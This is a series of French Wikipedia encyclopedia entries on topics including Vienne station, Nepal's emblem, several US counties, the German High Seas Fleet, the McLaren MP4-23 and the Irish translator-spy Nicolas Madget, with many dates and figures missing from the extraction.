Établie à d'altitude, la gare de Vienne est située au point kilométrique (PK) 542,409 de la ligne de Paris-Lyon à Marseille-Saint-Charles, entre les gares ouvertes d'Estressin et de Saint-Clair - Les Roches.
Histoire.
La Compagnie des chemins de fer de Paris à Lyon et à la Méditerranée (PLM), met en service la gare de Vienne lors de l'ouverture de la section entre Lyon (Guillotière) et Valence le .
Vers 1865, la gare et ses annexes vont connaître rapidement un développement important et les installations deviendront insuffisantes.
En 1898, le trafic du PLM se portant bien, une nouvelle extension est autorisée par décret, pour l'agrandissement des installations de la , c'est-à-dire pour les installations affectées au transport des marchandises non périssables et non urgentes. Vienne aura ainsi ses installations maximales, les voies de garage descendant jusqu'à la petite rue Lelièvre et un plan incliné les reliant à la voie du .
En 2007, l'horaire cadencé est mis en place sur les principales lignes de l'étoile de Lyon et, fin 2008, une seconde étape de ce cadencement a lieu avec renforcement des dessertes entre Lyon et les gares de Valence-Ville et Avignon-Centre.
Fréquentation.
En 2022, selon les estimations de la SNCF, la fréquentation annuelle de la gare est de . Ce nombre s'élève à en 2021, à en 2020, à en 2019, à en 2018, à en 2017, à en 2016 et à en 2015.
Service des voyageurs.
Accueil.
Gare SNCF, elle dispose d'un bâtiment voyageurs, avec guichet, ouvert tous les jours. Elle est équipée d'une salle d'attente et d'automates pour l'achat de titres de transport.
Depuis 2010, elle est totalement accessible aux personnes à mobilité réduite grâce à l'installation d'ascenseurs desservant chacun des trois quais, reliés par un souterrain, et par des élévateurs individuels pour accéder du quai aux trains.
Desserte.
Vienne est desservie par des trains TER Auvergne-Rhône-Alpes (lignes de Mâcon-Ville à Vienne / Valence) et par des trains TER Auvergne-Rhône-Alpes et TER PACA (lignes de Lyon-Part-Dieu à Avignon-Centre et Marseille-Saint-Charles).
Intermodalité.
Un parc pour les vélos et un parking pour les véhicules y sont aménagés.
La gare est desservie par les autobus du réseau urbain de Vienne L'va (lignes 1, 2, 3, 4, 6 et 7) ainsi que par les autocars interurbains des cars du Rhône (ligne 111) et Cars Région Isère (T35, T37, T52).

</doc>
<doc id="2845676" url="https://fr.wikipedia.org/wiki?curid=2845676" title="Bfl">
Bfl



</doc>
<doc id="2845678" url="https://fr.wikipedia.org/wiki?curid=2845678" title="Emblème du Népal">
Emblème du Népal

L'emblème du Népal ont été modifiées durant la période de réconciliation nationale faisant suite à la guerre civile. Le , un nouvel emblème est introduit.
Le , l'emblème est modifié pour ajouter la nouvelle carte du Népal incluant les revendications territoriales du Népal sur le territoire de Kalapani et le col de Lipulekh.
Il contient le drapeau du Népal, l'Everest, les collines vertes symbolisant les régions montagneuses du Népal et de couleur jaune symbolisant la fertile région de Terai, les mains d'un homme et d'une femme se rejoignent pour symboliser l'égalité des sexes. Au-dessus, une silhouette blanche représente la carte du Népal. Le tout est entouré d'une guirlande de rhododendrons (la fleur nationale). À la base des armoiries, un liseré rouge porte la devise nationale en sanskrit : जननी जन्मभूमिश्च स्वर्गादपी गरीयसी (jananī janmabhūmiśca svargādapi garīyasī), qui se traduit par « La mère et la mère patrie sont plus grandes que le ciel ».
Anciennes armoiries.
L'emblème en usage avant le se composait d'une vache blanche, un lophophore resplendissant, deux soldats gurkhas (l'un portant un kukri et un archet, et l'autre un fusil), les sommets de l'Himalaya, surmontés par deux drapeaux népalais, deux kukris, les traces de pas de la Gorakhnath (la divinité gardienne des Gurkhas) et le couronne royale.

</doc>
<doc id="2845681" url="https://fr.wikipedia.org/wiki?curid=2845681" title="Comté de Pawnee (Oklahoma)">
Comté de Pawnee (Oklahoma)

Le comté de Pawnee est un comté situé dans l'État de l'Oklahoma aux États-Unis. Le siège du comté est Pawnee. 
Selon le recensement de 2000, sa population est de .
Risque sismique.
Bien que non géologiquement prédisposé au risque sismique, ce comté est depuis le début du concerné par une augmentation régulière du nombre de séismes induits par les activités humaines (forages pétroliers et gaziers en l’occurrence qui font de plus en plus appel à la fracturation hydraulique et à l'injection sous haute pression) et de leur intensité. 
La multiplication des sites de forage de gaz de schiste et la réinjection dans les formations de schiste des eaux usagées et des produits chimiques utilisés a provoqué une hausse exponentielle des tremblements de terre dans cette partie des États-Unis depuis 2008 et le , un séisme de est survenu à au nord-ouest de Pawnee (épicentre : 36.430°N 96.932°W), durant près d'une minute, ; le Gouverneur M. Fallin a déclaré l'état d'urgence pour le Comté de Pawnee. L' "Oklahoma Corporation Commission" (Agence d'État chargée de réglementer l'industrie du pétrole et du gaz) a ordonné la fermeture immédiate des en activité sur une zone de carrés (), en demandant à l'industrie du gaz de schiste de travailler avec l'Environmental Protection Agency (EPA) qui a la compétence exclusive sur le contrôle de la sécurité des puits dans cette région.

</doc>
<doc id="2845683" url="https://fr.wikipedia.org/wiki?curid=2845683" title="Blason du Népal">
Blason du Népal



</doc>
<doc id="2845687" url="https://fr.wikipedia.org/wiki?curid=2845687" title="Comté de Pawnee (Nebraska)">
Comté de Pawnee (Nebraska)

Le comté de Pawnee est un comté situé au sud-est de l'État du Nebraska aux États-Unis. Le siège du comté est Pawnee City. Selon le recensement de 2010, sa population est de . Le comté a été fondé en 1854 et doit son nom à la tribu amérindienne Pawnee.

</doc>
<doc id="2845689" url="https://fr.wikipedia.org/wiki?curid=2845689" title="Hochseeflotte">
Hochseeflotte

La (« flotte de haute mer ») était la principale flotte de la "Kaiserliche Marine" (« marine impériale allemande ») au cours de la Première Guerre mondiale. Elle était basée à Wilhelmshaven dans la baie de Jade. Les différents amiraux qui la commandèrent furent : Friedrich von Ingenohl (1913-1915), Hugo von Pohl (1915-1916), Reinhard Scheer (1916-1918) et Franz von Hipper (1918). Elle posa une telle menace à la "Royal Navy" dans la maîtrise de la mer autour de la Grande-Bretagne que la "Grand Fleet" britannique dut rester concentrée dans la mer du Nord pendant la durée de la guerre, alors même que de nombreuses tâches urgentes dans d'autres théâtres de guerre furent annulées faute de navires.
Histoire.
La "Hochseeflotte" est formée en 1907 à partir de la "Heimatflotte". Elle était deux à trois fois plus petite que la "Grand Fleet" britannique. Cependant au cours de certaines périodes, dans la première année de la guerre, les flottes se retrouvaient dans des proportions équivalentes, en raison de la dispersion de la flotte britannique sur différents théâtres du conflit. Dans la dernière partie de la guerre, le rapport de force pencha en faveur des Britanniques. La marine allemande n'était pas disposée à risquer un affrontement direct des flottes, préférant une stratégie de raids dans la mer du Nord, dans le but d'attirer une partie de la flotte britannique qui pourrait être coupée et détruite. Cependant, les batailles à Heligoland Bight (28 août 1914), Dogger Bank (24 janvier 1915) et du Jutland (31 mai 1916) n'ont pas abouti, ne modifiant pas le rapport stratégique.
Étant donné que le blocus britannique causait de plus en plus de difficultés économiques en Allemagne, la marine impériale allemande a concentré ses ressources sur la guerre sous-marine sans restriction dans le but de remporter la première bataille de l'Atlantique et de détruire l'effort de guerre britannique. En dehors de deux sorties en et , la Hochseeflotte est restée à quai, se restreignant dans les manutentions portuaires pour le reste de la guerre.
En , devant la défaite de l'armée et les difficultés de la population civile (famine), Scheer décida de lancer une attaque à quitte ou double contre la Grand Fleet. Sachant que la décision d'attaquer subirait un veto, il n'en informa pas le gouvernement du Prince Max von Baden. Mais lorsque les ordres furent donnés à la flotte d'appareiller de Wilhelmshaven le , de nombreux marins refusèrent d'obéir ou désertèrent. Le plan fut abandonné, mais ces événements conduisirent à la mutinerie de Kiel, à la révolution en Allemagne, à la chute du gouvernement impérial, le , et à l'armistice du .
Selon les termes de l'armistice, la Hochseeflotte a été mise en internement sur la base de la Royal Navy à Scapa Flow dans les Orcades. Le transfert des navires a eu lieu en au cours de l’"Opération ZZ". Soixante cuirassés alliés escortèrent onze cuirassés, cinq croiseurs de bataille, huit croiseurs et quarante-huit destroyers de la Hochseeflotte en captivité. Le , le vice-amiral Ludwig von Reuter donna l'ordre de saborder les navires pour éviter qu'ils ne tombent dans les mains des Britanniques. Cinquante-trois navires furent alors coulés. Neuf officiers allemands et marins ont été tués quand les Britanniques tentèrent de prévenir les naufrages, et furent les dernières victimes de la Première Guerre mondiale. Le cuirassé , dernier cuirassé mis à flot en Allemagne de l'époque, fut longuement inspecté et analysé, ainsi que le dernier croiseur de bataille allemand, le . 
L'historien suédois Alf W Johansson considère que la création d'une telle flotte de haute mer pour la marine allemande est un exemple de bévue stratégique :
Dans cette ligne de pensée, Rosa Luxemburg voit dans la constitution de la marine allemande la principale cause de la Première Guerre mondiale à cause de la menace qu'elle faisait peser sur les lignes de communications britanniques.
Constitution de la flotte.
Les unités de la "Hochseeflotte" étaient en au nombre de:
Les navires de bataille, les navires de ligne, et les gardes-côtes cuirassés sont constitués en six escadres ("Geschwader"), les croiseurs en cinq groupes d'éclairage, ou de reconnaissance ("Afklärungsgruppen"):
Par la suite, les torpilleurs sont constitués en huit flottilles, et les sous-marins en deux flottilles.

</doc>
<doc id="2845690" url="https://fr.wikipedia.org/wiki?curid=2845690" title="L'Occitanienne ou le Dernier Amour de Chateaubriand">
L'Occitanienne ou le Dernier Amour de Chateaubriand

L'Occitanienne ou le Dernier Amour de Chateaubriand est un film français réalisé par Jean Périssé et sorti en 2008. Il s'agit de l'histoire vraie du dernier amour de Chateaubriand en 1829.
Synopsis.
Nuit d'orage et de passion amoureuse dans un hôtel de cure de Cauterets dans les Hautes-Pyrénées en 1829 entre Chateaubriand vieillissant (il a 61 ans) avec une jeune femme de l'aristocratie toulousaine, Léontine de Villeneuve, comtesse de Castelbajac, de près de 40 ans sa cadette (elle a 26 ans).
Analyse.
Histoire vraie du dernier amour de l'auteur des "Mémoires d'outre-tombe" qu'il évoque dans un chapitre de son autobiographie : « Voilà qu'en poétisant je rencontrai une jeune femme assise au bord du gave ; elle se leva et vint droit à moi : elle savait, par la rumeur du hameau, que j'étais à Cauterets. Il se trouva que l'inconnue était une Occitanienne, qui m'écrivait depuis deux ans sans que je l'eusse jamais vue : la mystérieuse anonyme se dévoila : "patuit Dea (elle semblait une déesse)".
J'allais rendre ma visite respectueuse à la naïade du torrent. Un soir qu'elle m'accompagnait lorsque je me retirais, elle me voulut suivre ; je fus obligé de la reporter chez elle dans mes bras. Jamais je n'ai été si honteux : inspirer une sorte d'attachement à mon âge me semblait une véritable dérision ; plus je pouvais être flatté de cette bizarrerie, plus j'en étais humilié, la prenant avec raison pour une moquerie » Chateaubriand - "Mémoires d’outre-tombe" Livre 31 Chapitre 1 .

</doc>
<doc id="2845691" url="https://fr.wikipedia.org/wiki?curid=2845691" title="Bfm">
Bfm



</doc>
<doc id="2845693" url="https://fr.wikipedia.org/wiki?curid=2845693" title="BFM">
BFM

BFM peut faire référence à :

</doc>
<doc id="2845698" url="https://fr.wikipedia.org/wiki?curid=2845698" title="Comté de Payne">
Comté de Payne

Le comté de Payne est un comté situé dans l'État de l'Oklahoma aux États-Unis. Le siège du comté est Stillwater. Selon le recensement de 2000, sa population est de habitants mais la population est estimée en 2006 à habitants. Le comté a été fondé en 1907 et doit son nom à David L. Payne, soldat et pionnier américain.

</doc>
<doc id="2845699" url="https://fr.wikipedia.org/wiki?curid=2845699" title="Fourmis pot-de-miel">
Fourmis pot-de-miel



</doc>
<doc id="2845705" url="https://fr.wikipedia.org/wiki?curid=2845705" title="Mobile Regional Airport">
Mobile Regional Airport



</doc>
<doc id="2845706" url="https://fr.wikipedia.org/wiki?curid=2845706" title="Purification de Marie">
Purification de Marie



</doc>
<doc id="2845708" url="https://fr.wikipedia.org/wiki?curid=2845708" title="Bates Field">
Bates Field



</doc>
<doc id="2845709" url="https://fr.wikipedia.org/wiki?curid=2845709" title="Ibéro-Amérique">
Ibéro-Amérique

Ibéro-Amérique est un terme formé à partir des mots Ibérie et Amérique pour désigner une zone d'une étendue et d'une cohésion culturelle considérables. Compte tenu du haut degré d'intelligibilité mutuelle entre portugais et espagnol (similarité lexicale de 90 %) et le fait que l'enseignement de l'espagnol au Brésil est obligatoire dans le secondaire, l'Ibéro-Amérique représente un domaine linguistique d'environ 650 millions de locuteurs et la troisième plus grande économie à l'échelle planétaire par son PIB. Le terme est étroitement lié à celui de Communauté ibéro-américaine de nations (CIN).
Présentation.
Sa portée et son sens restent toutefois confus: d'un côté le "" soutient que l'Ibéro-Amérique est la région représentée par les nations qui ont appartenu comme royaumes et provinces aux anciens Empires coloniaux espagnol et portugais, tout en affirmant que le gentilé « ibéro-américain » peut être appliqué à des personnes ou des organisations appartenant aussi bien à la péninsule Ibérique qu'à l'Amérique. D'autre part, la Communauté ibéro-américaine de Nations considère l'Ibéro-Amérique comme la région à laquelle appartiennent ses membres, y compris, non seulement les pays américains et ibériques de langue hispanique et portugaise, mais également l'Andorre, de langue catalane. La définition du manque également de clarté car il n'y a pas de correspondance exacte entre les colonies américaines espagnoles et portugaises et les actuelles nations américaines.
Tandis que certains auteurs privilégient le sens étymologique et historique du terme "Ibéro-Amérique", qui excluait les pays non américains, le concept s'est peu à peu étendu pour finir par inclure l'Espagne, le Portugal et la principauté d'Andorre, et même potentiellement certains pays d'Afrique et d'Asie. Ainsi la Charte culturelle ibéro-américaine définit l'Ibéro-Amérique comme un « espace culturel dynamique et singulier ; dans ce dernier on reconnaît une profondeur historique notable, une pluralité d'origines et des manifestations variées ». La CCI est une déclaration produite au cours des sommets ibéro-américains par tous les représentants des pays qui sentent une appartenance à l'Ibéro-Amérique.
Les nations américaines de langue hispanique et portugaise et la péninsule ibérique intègrent la Communauté ibéro-américaine de nations, qui réalise annuellement un sommet ibéro-américain auquel participent les chefs d'État et de gouvernement des pays membres.

</doc>
<doc id="2845711" url="https://fr.wikipedia.org/wiki?curid=2845711" title="Claire Dautherives">
Claire Dautherives

Claire Dautherives est une skieuse française, membre de l'équipe de France de ski alpin, née le 5 septembre 1982 à Saint-Jean-de-Maurienne. Ses disciplines sont le slalom et le géant.
Elle a obtenu ses premiers points en coupe du monde durant la saison 2007/2008.
Biographie.
Claire Dautherives est la cadette d'une famille de trois enfants (Béatrice, Jérôme, Claire). Elle vit à Lanslebourg-Mont-Cenis (commune nouvelle, station de Val Cenis) .
Après avoir suivi une scolarité classique jusqu'au collège, elle a intégré la section ski-études de Modane puis celle du lycée de La Motte-Servolex, où elle a obtenu son baccalauréat.
Elle intègre l'équipe de France de ski en 1999 dans le groupe Espoir nommé "Horizon 2002".
Elle participe à sa première coupe du monde le 26 janvier 2003 à Maribor (SLO).
S'étant blessée le 5 janvier 2004 à Megève, où elle se casse les ligaments croisés, elle suit une rééducation et une remise en forme assez longue, hors de la fédération française de ski. Elle réintègre l'équipe de France en 2008, après avoir gagné une place à l'année en coupe du Monde grâce à une au classement général de la coupe d'Europe.

</doc>
<doc id="2845714" url="https://fr.wikipedia.org/wiki?curid=2845714" title="McAlester (Oklahoma)">
McAlester (Oklahoma)



</doc>
<doc id="2845715" url="https://fr.wikipedia.org/wiki?curid=2845715" title="Comté de Pittsburg">
Comté de Pittsburg

Le comté de Pittsburg est un comté situé dans l'État de l'Oklahoma aux États-Unis. Le siège du comté est McAlester. Selon le recensement de 2000, sa population est de .

</doc>
<doc id="2845720" url="https://fr.wikipedia.org/wiki?curid=2845720" title="McLaren MP4-23">
McLaren MP4-23

La McLaren MP4-23 est la monoplace de Formule 1 engagée par l'écurie Vodafone McLaren Mercedes engagée dans le championnat du monde de Formule 1 2008. Présentée à Stuttgart le , elle effectue son premier roulage le sur le circuit de Jerez en Espagne. Elle est pilotée par l'Anglais Lewis Hamilton et le Finlandais Heikki Kovalainen. Les pilotes d'essais sont l'Anglais Gary Paffett et l'Espagnol Pedro de la Rosa. C'est le quatorzième modèle de Formule 1 conçu par McLaren et motorisé par Mercedes.
Historique.
Le Grand Prix inaugural en Australie se solde par la victoire de Hamilton. Au Grand Prix suivant, son coéquipier Heikki Kovalainen obtient son premier podium avec McLaren grâce à une troisième place. Le Finlandais obtient sa première pole position au Grand Prix de Grande-Bretagne et empoche sa première victoire au Grand Prix de Hongrie.
Au Grand Prix de Belgique, Lewis Hamilton remporte la victoire, mais il écope une pénalité de 25 secondes pour avoir coupé une chicane dans le but de dépasser Kimi Räikkönen et est rétrogradé à la troisième place.
À la fin de la saison, McLaren Racing termine deuxième du championnat des constructeurs avec 151 points, 21 de moins que Ferrari. Lewis Hamilton devient cependant champion du monde avec un point d'avance sur Felipe Massa.
Elle est à ce jour la dernière monoplace de l'écurie McLaren à avoir remporté le championnat pilote, avec Lewis Hamilton à son bord.
McLaren MP4-23K.
Lors des essais de l'intersaison 2008-2009, McLaren teste une version K de sa MP4-23, comportant notamment un SREC et un aileron avant élargi, modifications qui seront utilisées sur la McLaren MP4-24 de 2009.

</doc>
<doc id="2845721" url="https://fr.wikipedia.org/wiki?curid=2845721" title="Bloemfontein Airport">
Bloemfontein Airport



</doc>
<doc id="2845723" url="https://fr.wikipedia.org/wiki?curid=2845723" title="Aéroport de Bloemfontein">
Aéroport de Bloemfontein



</doc>
<doc id="2845725" url="https://fr.wikipedia.org/wiki?curid=2845725" title="Laures">
Laures



</doc>
<doc id="2845728" url="https://fr.wikipedia.org/wiki?curid=2845728" title="IbéroAmérique">
IbéroAmérique



</doc>
<doc id="2845730" url="https://fr.wikipedia.org/wiki?curid=2845730" title="Bfn">
Bfn



</doc>
<doc id="2845731" url="https://fr.wikipedia.org/wiki?curid=2845731" title="BFN">
BFN

BFN est un code qui peut signifier :
BFN peut désigner :

</doc>
<doc id="2845737" url="https://fr.wikipedia.org/wiki?curid=2845737" title="Comté de Pontotoc (Oklahoma)">
Comté de Pontotoc (Oklahoma)

Le comté de Pontotoc est un comté situé dans l'État de l'Oklahoma, aux États-Unis. Le siège du comté est Ada. Selon le recensement de 2000, sa population est de .

</doc>
<doc id="2845741" url="https://fr.wikipedia.org/wiki?curid=2845741" title="Nicolas Madget">
Nicolas Madget

Nicolas Madget ou Nicholas Madgett, né en à Kinsale, près de Cork (Irlande), et mort le était un patriote et traducteur irlandais. Chef du bureau de traduction au ministère français des Affaires étrangères sous la Révolution, il était interprète au ministère de la Marine sous le Premier Empire.
Il est généralement confondu avec son cousin et homonyme Nicolas Madget, ecclésiastique et espion irlandais né à 1758 à Tralee, dans le comté de Kerry.
Recruté par Bertrand Barère de Vieuzac dans les bureaux du Comité de salut public pendant la Terreur, Nicolas Madget, qui remplaça Thomas Paine envoyé en prison, était espion irlandais chargé de démanteler les réseaux d'indépendantistes irlandais sur le continent. Appartenant au contre-espionnage sous le ministère William Pitt, il infiltra les services secrets français, employa des agents secrets comme ses amis Richard Ferris ou Charles Marien Somers, jusqu'au départ de Charles-François Delacroix.
Biographie.
Né à Kinsale, près de Cork, en 1740, Nicolas Madget partit en France, où il mena des études de théologie. Il fut pensionnaire ("socius") de l"'Irish College" de Toulouse, le séminaire des Irlandais, à partir de l'année 1760-1761, devint sous-diacre le , diacre le et obtint son doctorat. Comme "alumnus", il acquit « des droits sur la résidence des Irlandais en France », selon les lettres patentes de 1660 et 1701, concernant les prêtres et "alumni" du séminaire de Toulouse qui pouvaient « jouir des mêmes franchises et libertés que les Français et posséder tous biens meubles et immeubles nonobstant édits et ordonnances contre les étrangers ». Naturalisé, il commença par enseigner à l'université de Bordeaux puis, il fut choisi par l'archevêque de Bordeaux pour enseigner la physique au collège royal de la Madeleine où il professa à partir de 1765. Initié à la franc-maçonnerie, il s'affilia à la loge « Harmonie » le .
En 1789, Nicolas Madget abandonna l'enseignement et partit pour Paris, où il fut recruté par Bertrand Barère de Vieuzac, qu'il avait autrefois connu à Toulouse. Ce dernier lui proposa de l'aider à s'occuper de son journal "le Point du jour" et lui confia la traduction des articles qu'il désirait envoyer en Angleterre.
À partir de cette époque, Nicolas Madget cultiva sa réputation d'ami de la Révolution, prenant en tout modèle sur Barère qui le salariait. Lorsque le , Jean-François Varlet proposa à l'Assemblée législative de donner un gouverneur au dauphin ; Barère insista fortement pour que Nicolas Madget en fût chargé. Mais contre son attente, la proposition ne fut pas retenue par l'Assemblée.
Madget s'insinue au ministère des Affaires étrangères.
Le , trois représentants de la Municipalité se présentèrent au Collège des Irlandais de Paris, rue du Cheval Vert, où la plupart des étudiants étaient favorables à la Révolution et à l'indépendance de l'Irlande. Ils accompagnaient Nicolas Madget, lui-même entouré de quatre étudiants en médecine. Le traducteur de Barère fut officiellement désigné et installé comme administrateur du collège irlandais, et la cérémonie se termina par des chants. Le supérieur en place, l'abbé Kearney, protesta vivement dans une lettre au ministre des Affaires étrangères Lebrun-Tondu contre cette façon de procéder, qui était contraire aux lois françaises qui reconnaissaient le séminaire comme un établissement étranger placé en dehors de la juridiction de la municipalité. Lebrun transmit la protestation au ministre de l'Intérieur, et Madget fut désavoué et débouté. Mais ce n'était qu'un répit. Les collèges, particulièrement les collèges britanniques étaient un point d'ancrage de l'espionnage britannique en France et il était impensable, pour le contre-espionnage britannique, de ne pas contrôler un collège aussi important que le principal collège des irlandais à Paris. C'était l'esprit de l'intervention de Madget. Mais c'est grâce à Jean-Paul Marat, que l'on put enfin se débarrasser de l'abbé Charles Kearney qui, le , fut jeté en prison. Le gouvernement britannique avait besoin d'un homme sûr à la tête du collège et il y fit placer des gens à sa dévotion. Les collèges britanniques jouaient, depuis le début de la Révolution, un rôle important dans l'espionnage britannique, et particulièrement celui de Saint-Omer - où William Pitt et Edmund Burke avaient été éduqués - qui en fut la principale antenne sur le continent notamment depuis que Nathaniel Parker-Forth s'en servait comme base logistique pour ses diverses opérations entre Versailles, Paris et Londres. Lorsque l'attention publique fut dirigée en sur cet établissement, c'est Jacques Nicolas Billaud-Varenne qui, à la demande de Bertrand Barère de Vieuzac, se chargea d'encadrer l'arrestation des administrateurs, notamment son principal, Gregory Stapleton, qui ne fut jamais interrogé ou jugé.
Fortement recommandé par Bertrand Barère de Vieuzac, Nicolas Madget offrit ses services au ministre brissotin Lebrun-Tondu, qui accepta, à cause du poids politique de Barère, qui venait de faire condamner Louis XVI à mort. Mais Lebrun-Tondu apprit vite à se méfier de lui. Cependant, Nicolas Madget lui adressa quelques propositions après la déclaration de guerre avec l'Angleterre: « Il faut envoyer et entretenir en Angleterre, et surtout en Irlande, un certain nombre de patriotes anglais et irlandais pour y répandre les principes de la liberté, lui écrivait-il le . Il faudrait, pour cette mission des hommes d'une grande force, tant pour les connaissances politiques que pour le talent d'écrire. J'en connais un qui, à cette double qualité, réunit celle du civisme le plus pur. Je l'ai déjà sondé sur l'entreprise et il paraît disposé à s'en charger s'il est autorisé ». 
Cependant, à Paris, l'abbé Nicolas Madget avait opéré une autre réussite : il avait recommandé à Lebrun-Tondu d'envoyer de jeunes Irlandais connus pour leur sympathie indépendantistes, en mission en Angleterre. À peine eurent-ils mis pied sur le sol anglais qu'ils furent interceptés par les services secrets anglais, en vue de les « retourner ». seul l'un d'entre eux, Duckett resta fidèle à l'idéal des Defenders et, revenu en Europe, il secondera activement les activités anti-britanniques sur le continent. C'est un autre prêtre irlandais, ami de trente ans (et futur exécuteur testamentaire) de Nicolas Madget, Richard Ferris, qui s'était chargé d'annoncer à lord Grenville, directeur du Foreign Office, l'arrivée « en grand secret » des jeunes patriotes irlandais. Dorénavant, une des activités principales de Nicolas Madget, caché dans les bureaux français, consistera à neutraliser les efforts des indépendantistes irlandais et écossais en communiquant à temps les informations à Londres. C'est Richard Ferris et Charles Marien Somers, eux aussi anciens prêtres, qui se chargèrent de la liaison entre Madget et les services d'espionnage du Foreign Office.
Charles Somers et la mission perdue de William Jackson.
Charles Marien Somers, né à Wexford (soi-disant à la Jamaïque), s'était, comme Madget, fait naturaliser français et, avant la Révolution, il avait enseigné au collège de La Flèche, avant de devenir chanoine de Vendôme. Venu à Paris, affectant d'être partisan des idées nouvelles, il vivait avec la jolie veuve d'un cordonnier, logeant tant à Paris qu'à Versailles. Il entretenait de hautes relations aristocratiques notamment avec la famille Baude la Vieuville qui avait conservé comme lui des intérêts à la Jamaïque, et qui était apparentée au fameux comte de Butler lequel, avec Hyde de Neuville, fut un inlassable agent de l'Angleterre et de la chouannerie. D'après les très nombreux documents conservés au Public Record Office à Londres, Charles Somers était payé dès le début de la Révolution par le gouvernement britannique pour spéculer à toutes fins utiles sur une évolution des événements qui serait favorable aux intérêts supérieurs de la Grande Bretagne. Il connaissait Nicolas Madget - son « ami pour la vie » - qui a raconté plus tard comment le Comité de salut public l'avait employé comme « agent du contre-espionnage français » ! Cela confirme l'assertion de Lewis Goldsmith selon laquelle, derrière Nicolas Madget, c'était bien Bertrand Barère de Vieuzac qui avait recruté ces agents anglais. Particulièrement adroit et intelligent, comme l'étaient ces prêtres ayant bénéficié d'un enseignement supérieur, Charles Somers a adressé un nombre considérable de lettres et de rapports à lord Grenville et par la suite à William Wickham qui devait prendre en la suite de sir Robert Fitzgerald en Suisse, au point que sous le Directoire, malgré ses précautions infinies, on commença à le prendre pour ce qu'il était vraiment, à tout le moins un individu extrêmement dangereux pour la République. En 1793, le gouvernement britannique voulait mettre la main sur le révérend William Jackson, alors en Europe, qui était, lui, absolument Irlandais de cœur, et favorable à un soutien français à la cause la cocarde verte (la « "green cockade" » était un signe de ralliement des indépendantistes). Jackson état un homme à la forte personnalité qui avait été longtemps protégé par la duchesse de Kingston, une grande dame qui fut longtemps indésirable sur le sol anglais, et qui disposait d'une fortune considérable qu'elle usa en partie pour la cause de l'Irlande.
À Paris, en 1792, William Jackson avait relayé les efforts de lord William Fitzgerald - à ne pas confondre avec Robert, ambassadeur en Suisse - et de Thomas Paine pour que le gouvernement français apporte un soutien logistique aux nationalistes, ou mieux débarque en Irlande pour favoriser une Révolution démocratique et proclamer l'indépendance de l'île. Mais chaque fois, des forces obscures semblèrent contrarier cette volonté. Le ministre des affaires étrangères Lebrun-Tondu, en particulier, fut trompé par une succession de rapports infidèles sur l'état des esprits en Irlande et sur les chances de succès d'une opération militaire sur les côtes irlandaises. Une souricière fut tendue à Jackson devenu trop dangereux et incontrôlable. Nicolas Madget, en liaison avec l'imprimeur John Stone, lui aussi employé et protégé par Barère, se chargèrent de tracer à Jackson un plan de route - immédiatement communiqué à lord Grenville par le propre frère de John Stone, William -, au terme duquel Jackson devait débarquer en Irlande pour y évaluer les chances de succès d'un débarquement français (qui, Barère le savait fort bien, n'était absolument pas dans ses plans ni dans ceux de son collègue Lazare Carnot qui était, semble-t-il, initié aux secrets de Barère). Embarqué en , Jackson fut reconnu, suivi, épié, doublé, trahi par quelques membres d'une organisation très sophistiquée. Le but à atteindre était de le surprendre en flagrant délit d'espionnage, avec des preuves matérielles à l'appui pour nourrir une accusation contre lui. Ainsi fut fait, et Jackson fut arrêté en en Irlande. Au terme d'une longue détention, il fut jugé, odieusement chargé par Charles Marien Somers, venu spécialement pour cela et condamné à mort. On raconte qu'à la veille d'être exécuté, il se serait empoisonné, mais un doute subsiste sur les circonstances exactes de la mort de cet homme courageux dont on a essayé, par la suite, de noircir la mémoire auprès de ses admirateurs catholiques. Cette mort est, tout cas, l'œuvre des trois recrues de Barère : Madget, Somers et Stone.
Madget entre au Comité de salut public.
Premier entré au Comité de salut public dont il fut membre inamovible, Bertrand Barère de Vieuzac doubla le ministre en titre et prit peu à peu le contrôle des affaires étrangères et de la diplomatie secrète qu'il se partagea avec Jean-Marie Hérault de Séchelles, avant que celui-ci ne fût livré en pâture au Tribunal révolutionnaire de Fouquier-Tinville et que ses papiers personnels fussent mis sous contrôle. Au début de l'hiver 1793, Nicolas Madget fut officiellement employé à la deuxième division (marine) du Comité de salut public, qui était un poste clé ayant à voir avec toutes les opérations liées aux colonies. À cette époque, Richard Ferris, son ami, est devenu lui aussi un des rouages du contre-espionnage britannique en France et, à lire ses lettres à Edmund Burke, on ne doute pas un instant de son rejet profond de la Révolution française. Mais il n'empêche, le ministre François-Louis-Michel Chemin-Deforgues, successeur de Lebrun sous le coup d'une inculpation depuis le , lui confie diverses missions qui n'eurent aucun résultat satisfaisant du moins pour les Français. Au contraire, Richard Ferris dénonce dans ses dépêches à Londres, les agents d'origine irlandaise ou écossaise qui désirent servir les intérêts de la République, ainsi l'Écossais Richard Mac Dermott, alors en Angleterre pour identifier l'auteur de la fameuse « Lettre anglaise » et les notes l'accompagnant, un texte explosif qui, à la Convention, avait alimenté bien des craintes et entraîné comme Barère le souhaitait un durcissement des rouages répressifs. Cette lettre d'instruction qui était l'œuvre d'un supérieur de séminaire irlandais nommé Parker, tombée par inadvertance dans les mains des Français, était révélatrice du programme d'incendie et de sabotage, de corruption et d'espionnage conçu par le gouvernement britannique, destiné à déstabiliser la République de l'intérieur et à précipiter la Terreur en réaction.
Désirant confier à Nicolas Madget la propagande et la désinformation en direction de l'étranger (les « carmagnoles » à destination de la presse étrangère), Barère et Lazare Carnot l'installèrent à la tête du nouveau bureau des traductions du Comité de salut public - détaché le 12 germinal an II de l'ancien ministère des Affaires étrangères lui-même devenu une commission d'enregistrement des décisions du Comité de salut public - où il entra officiellement en fonction par arrêté en date du 11 pluviôse an II, en remplacement de Thomas Paine que Barère avait prévu de faire guillotiner quand le moment serait venu, en l'impliquant dans une de ces fausses conspirations de prison. Nicolas Madget traduisit ou fit traduire des discours de Maximilien de Robespierre et d'Antoine de Saint-Just, afin de pouvoir commodément les présenter comme les vrais artisans de la Terreur, alors que c'était Barère, appuyé de ses éternels cosignataires Lazare Carnot, Jean-Marie Collot d'Herbois et Jacques Nicolas Billaud-Varenne, et leurs obligés du Comité de sûreté générale, qui en tiraient les ficelles à Lyon, Arras, en Vendée et à Paris même.

</doc>
<doc id="2845745" url="https://fr.wikipedia.org/wiki?curid=2845745" title="Jerry Johnson">
Jerry Johnson

Jerry Johnson, né le à Lancaster en Pennsylvanie (États-Unis) est un joueur de basket-ball professionnel américain-kazakhstanais. Il mesure 1,83 m.
Biographie.
Jerry Johnson naît et grandit à Lancaster, dans l'État de Pennsylvanie. Il est scolarasisé à la John Piersol McCaskey High School de 1997 à 2001 et y inscrit le record de point de l'équipe local (1792 points).
